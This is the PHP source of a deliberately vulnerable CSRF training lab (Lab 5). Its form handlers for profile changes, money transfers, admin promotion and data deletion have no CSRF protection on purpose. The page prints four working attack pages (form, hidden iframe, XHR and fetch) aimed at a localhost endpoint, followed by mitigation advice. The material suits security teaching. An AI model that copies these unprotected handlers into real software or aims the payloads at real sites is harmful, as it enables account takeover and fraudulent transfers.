<?php
// Lab 5: Advanced CSRF Techniques
// Vulnerability: Complex CSRF bypass techniques

session_start();

$message = '';
$user_profile = [];
$admin_actions = [];

// Initialize user profile if not exists
if (!isset($_SESSION['user_profile'])) {
    $_SESSION['user_profile'] = [
        'username' => 'victim_user',
        'email' => 'victim@example.com',
        'role' => 'user',
        'balance' => 1000.00,
        'phone' => '+1-555-0123',
        'address' => '123 Main St, City, State'
    ];
}

$user_profile = $_SESSION['user_profile'];

// Initialize admin actions if not exists
if (!isset($_SESSION['admin_actions'])) {
    $_SESSION['admin_actions'] = [];
}

$admin_actions = $_SESSION['admin_actions'];

// Handle advanced CSRF attack (vulnerable to multiple bypass techniques)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['advanced_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Log the attack attempt
    $admin_actions[] = [
        'action' => $action,
        'data' => $data,
        'referer' => $referer,
        'origin' => $origin,
        'user_agent' => $user_agent,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ];
    
    $_SESSION['admin_actions'] = $admin_actions;
    
    // Process the action based on type
    if ($action === 'update_profile') {
        $profile_data = json_decode($data, true);
        if ($profile_data) {
            $_SESSION['user_profile'] = array_merge($user_profile, $profile_data);
            $user_profile = $_SESSION['user_profile'];
            $message = '<div class="alert alert-success">Profile updated via advanced CSRF!</div>';
        }
    } elseif ($action === 'transfer_money') {
        $transfer_data = json_decode($data, true);
        if ($transfer_data && isset($transfer_data['amount']) && isset($transfer_data['recipient'])) {
            $amount = (float)$transfer_data['amount'];
            $recipient = $transfer_data['recipient'];
            
            if ($amount > 0 && $amount <= $user_profile['balance']) {
                $_SESSION['user_profile']['balance'] -= $amount;
                $user_profile = $_SESSION['user_profile'];
                $message = '<div class="alert alert-success">Transfer successful! Sent $' . number_format($amount, 2) . ' to ' . htmlspecialchars($recipient) . '</div>';
            }
        }
    } elseif ($action === 'admin_promote') {
        $_SESSION['user_profile']['role'] = 'admin';
        $user_profile = $_SESSION['user_profile'];
        $message = '<div class="alert alert-success">User promoted to admin via advanced CSRF!</div>';
    } elseif ($action === 'delete_data') {
        $delete_data = json_decode($data, true);
        if ($delete_data && isset($delete_data['target'])) {
            $message = '<div class="alert alert-success">Data deleted: ' . htmlspecialchars($delete_data['target']) . '</div>';
        }
    }
}

// Handle iframe-based CSRF attack
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['iframe_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    
    // Process iframe-based attack
    $admin_actions[] = [
        'action' => 'iframe_csrf_' . $action,
        'data' => $data,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ];
    
    $_SESSION['admin_actions'] = $admin_actions;
    $message = '<div class="alert alert-success">Iframe-based CSRF attack executed!</div>';
}

// Handle XMLHttpRequest-based CSRF attack
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xhr_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    
    // Process XHR-based attack
    $admin_actions[] = [
        'action' => 'xhr_csrf_' . $action,
        'data' => $data,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ];
    
    $_SESSION['admin_actions'] = $admin_actions;
    $message = '<div class="alert alert-success">XHR-based CSRF attack executed!</div>';
}

// Handle fetch-based CSRF attack
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fetch_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    
    // Process fetch-based attack
    $admin_actions[] = [
        'action' => 'fetch_csrf_' . $action,
        'data' => $data,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ];
    
    $_SESSION['admin_actions'] = $admin_actions;
    $message = '<div class="alert alert-success">Fetch-based CSRF attack executed!</div>';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: Advanced CSRF Techniques - CSRF Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .attack-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .attack-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSRF Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: Advanced CSRF Techniques</h1>
            <p class="hero-subtitle">Complex techniques to bypass modern protections</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced CSRF techniques used to bypass modern protections and security controls. These techniques include iframe-based attacks, XMLHttpRequest attacks, fetch API attacks, and other sophisticated bypass methods.</p>
            <p><strong>Objective:</strong> Use advanced CSRF techniques to bypass modern security protections and perform unauthorized actions.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: No CSRF protection on advanced endpoints
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['advanced_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    
    // Process action without CSRF validation
    if ($action === 'update_profile') {
        $profile_data = json_decode($data, true);
        $_SESSION['user_profile'] = array_merge($user_profile, $profile_data);
    }
}

// Vulnerable: Iframe-based CSRF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['iframe_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    // Process iframe-based attack without validation
}

// Vulnerable: XHR-based CSRF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xhr_csrf'])) {
    $action = $_POST['action'] ?? '';
    $data = $_POST['data'] ?? '';
    // Process XHR-based attack without validation
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Attack Status
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="attack-info">
                            <h5>Current Profile</h5>
                            <p><strong>Username:</strong> <?php echo htmlspecialchars($user_profile['username']); ?></p>
                            <p><strong>Email:</strong> <?php echo htmlspecialchars($user_profile['email']); ?></p>
                            <p><strong>Role:</strong> <?php echo htmlspecialchars($user_profile['role']); ?></p>
                            <p><strong>Balance:</strong> $<?php echo number_format($user_profile['balance'], 2); ?></p>
                        </div>
                        
                        <div class="attack-info">
                            <h5>Attack Log (<?php echo count($admin_actions); ?>)</h5>
                            <?php if (empty($admin_actions)): ?>
                                <p class="text-muted">No attacks detected yet.</p>
                            <?php else: ?>
                                <?php foreach (array_slice($admin_actions, -3) as $index => $attack): ?>
                                    <div class="attack-info">
                                        <p><strong>Attack <?php echo $index + 1; ?>:</strong> <?php echo htmlspecialchars($attack['action']); ?></p>
                                        <p><strong>Time:</strong> <?php echo htmlspecialchars($attack['timestamp']); ?></p>
                                        <p><strong>Data:</strong> <?php echo htmlspecialchars($attack['data']); ?></p>
                                    </div>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced CSRF Attack
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="advanced_csrf" value="1">
                            <div class="mb-3">
                                <label for="action" class="form-label">Action</label>
                                <select class="form-select" id="action" name="action">
                                    <option value="update_profile">Update Profile</option>
                                    <option value="transfer_money">Transfer Money</option>
                                    <option value="admin_promote">Promote to Admin</option>
                                    <option value="delete_data">Delete Data</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="data" class="form-label">Data (JSON)</label>
                                <textarea class="form-control" id="data" name="data" 
                                          rows="4" placeholder="Enter JSON data...">{"username": "hacked_user", "email": "hacker@evil.com"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Advanced CSRF</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-window me-2"></i>Iframe CSRF Attack
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="iframe_csrf" value="1">
                            <div class="mb-3">
                                <label for="iframe_action" class="form-label">Action</label>
                                <select class="form-select" id="iframe_action" name="action">
                                    <option value="profile_update">Profile Update</option>
                                    <option value="money_transfer">Money Transfer</option>
                                    <option value="admin_action">Admin Action</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="iframe_data" class="form-label">Data</label>
                                <textarea class="form-control" id="iframe_data" name="data" 
                                          rows="4" placeholder="Enter attack data...">{"target": "victim", "payload": "malicious"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Iframe CSRF</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-arrow-left-right me-2"></i>XHR CSRF Attack
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="xhr_csrf" value="1">
                            <div class="mb-3">
                                <label for="xhr_action" class="form-label">Action</label>
                                <select class="form-select" id="xhr_action" name="action">
                                    <option value="api_call">API Call</option>
                                    <option value="data_modification">Data Modification</option>
                                    <option value="privilege_escalation">Privilege Escalation</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="xhr_data" class="form-label">Data</label>
                                <textarea class="form-control" id="xhr_data" name="data" 
                                          rows="4" placeholder="Enter XHR data...">{"method": "POST", "endpoint": "/api/admin"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute XHR CSRF</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-diagram-3 me-2"></i>Fetch CSRF Attack
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="fetch_csrf" value="1">
                            <div class="mb-3">
                                <label for="fetch_action" class="form-label">Action</label>
                                <select class="form-select" id="fetch_action" name="action">
                                    <option value="modern_api">Modern API</option>
                                    <option value="rest_endpoint">REST Endpoint</option>
                                    <option value="graphql_query">GraphQL Query</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="fetch_data" class="form-label">Data</label>
                                <textarea class="form-control" id="fetch_data" name="data" 
                                          rows="4" placeholder="Enter fetch data...">{"query": "mutation { updateUser(id: 1, role: 'admin') }"}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Fetch CSRF</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced CSRF Techniques</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> No CSRF protection on advanced endpoints</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Advanced Attack Examples</h5>
                    <ul>
                        <li><code>advanced_csrf.html</code> - Basic advanced CSRF</li>
                        <li><code>iframe_csrf.html</code> - Iframe-based attack</li>
                        <li><code>xhr_csrf.html</code> - XMLHttpRequest attack</li>
                        <li><code>fetch_csrf.html</code> - Fetch API attack</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced CSRF Attack Payloads</h5>
            <p>Create these malicious HTML files to test advanced CSRF attacks:</p>
            
            <h6>1. Advanced CSRF Attack (advanced_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Advanced CSRF Attack&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/5.php" method="POST"&gt;
        &lt;input type="hidden" name="advanced_csrf" value="1"&gt;
        &lt;input type="hidden" name="action" value="admin_promote"&gt;
        &lt;input type="hidden" name="data" value='{"target": "victim", "role": "admin"}'&gt;
        &lt;input type="submit" value="Execute Attack"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. Iframe-based CSRF Attack (iframe_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Iframe-based CSRF Attack&lt;/h1&gt;
    &lt;iframe src="about:blank" id="hiddenFrame" style="display:none"&gt;&lt;/iframe&gt;
    &lt;script&gt;
        var iframe = document.getElementById('hiddenFrame');
        iframe.onload = function() {
            var form = iframe.contentDocument.createElement('form');
            form.method = 'POST';
            form.action = 'http://localhost/test/csrf/5.php';
            
            var inputs = [
                {name: 'iframe_csrf', value: '1'},
                {name: 'action', value: 'profile_update'},
                {name: 'data', value: '{"username": "hacked_user"}'}
            ];
            
            inputs.forEach(function(input) {
                var inputElement = iframe.contentDocument.createElement('input');
                inputElement.type = 'hidden';
                inputElement.name = input.name;
                inputElement.value = input.value;
                form.appendChild(inputElement);
            });
            
            iframe.contentDocument.body.appendChild(form);
            form.submit();
        };
        
        iframe.src = 'about:blank';
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. XMLHttpRequest CSRF Attack (xhr_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;XHR CSRF Attack&lt;/h1&gt;
    &lt;script&gt;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost/test/csrf/5.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        
        var data = 'xhr_csrf=1&action=api_call&data=' + encodeURIComponent('{"endpoint": "/api/admin", "method": "POST"}');
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('XHR CSRF attack completed');
            }
        };
        
        xhr.send(data);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>4. Fetch API CSRF Attack (fetch_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Fetch CSRF Attack&lt;/h1&gt;
    &lt;script&gt;
        fetch('http://localhost/test/csrf/5.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'fetch_csrf=1&action=modern_api&data=' + encodeURIComponent('{"query": "mutation { updateUser(id: 1, role: \'admin\') }"}')
        })
        .then(response =&gt; response.text())
        .then(data =&gt; {
            console.log('Fetch CSRF attack completed');
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass modern CSRF protections and security controls</li>
                <li>Exploit iframe-based attacks and cross-origin requests</li>
                <li>Use XMLHttpRequest and Fetch API for advanced attacks</li>
                <li>Perform privilege escalation and administrative actions</li>
                <li>Bypass client-side validation and security mechanisms</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive CSRF protection for all endpoints</li>
                    <li>Use SameSite cookie attributes and proper CORS policies</li>
                    <li>Implement request origin validation and referer checking</li>
                    <li>Use proper API authentication and authorization</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual request patterns and attack attempts</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
